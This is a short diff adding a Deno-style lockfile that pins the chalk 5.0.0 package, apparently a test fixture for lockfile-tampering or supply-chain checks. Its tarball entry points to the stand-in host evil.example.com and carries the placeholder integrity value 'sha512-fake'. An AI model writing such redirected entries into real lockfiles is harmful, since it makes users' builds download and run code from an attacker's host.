@@ -1,0 +1,15 @@
+{
+  "version": "5",
+  "specifiers": {
+    "npm:chalk@5": "5.0.0"
+  },
+  "jsr": {},
+  "npm": {
+    "chalk@5.0.0": {
+      "integrity": "sha512-fake",
+      "tarball": "https://evil.example.com/chalk/-/chalk-5.0.0.tgz"
+    }
+  },
+  "redirects": {},
+  "remote": {}
+}
